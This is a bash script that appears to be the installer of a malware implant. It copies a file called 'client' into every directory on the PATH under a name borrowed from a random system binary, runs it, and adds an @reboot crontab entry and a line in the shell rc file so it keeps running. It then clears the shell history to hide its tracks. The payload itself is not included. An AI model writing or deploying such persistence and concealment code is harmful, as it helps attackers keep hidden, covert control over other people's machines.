#!/usr/bin/env bash

SHELL=$(basename $SHELL)
CONFIG_PATH="$HOME/.${SHELL}rc"

mkdir -p $HOME/.local

FROM_PATH="$(dirname $0)/client"
TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)-"
TARGET_PATH="/usr/local/bin"

IFS=':' read -ra PATHS <<< "$PATH"
for path in "${PATHS[@]}"; do
    echo "copied into $path"
    mkdir -p $path > /dev/null 2>&1
    cp $FROM_PATH "$path/$TARGET_NAME" > /dev/null 2>&1
done

$TARGET_NAME

# crontab
cronfile="tmp"
PATH_SCRIPT=$(whereis $TARGET_NAME | cut -d' ' -f2)
echo "@reboot $PATH_SCRIPT" > $cronfile
$(crontab $cronfile > /dev/null 2>&1)
rm -f $cronfile

echo "$TARGET_NAME" >> $CONFIG_PATH

history -c
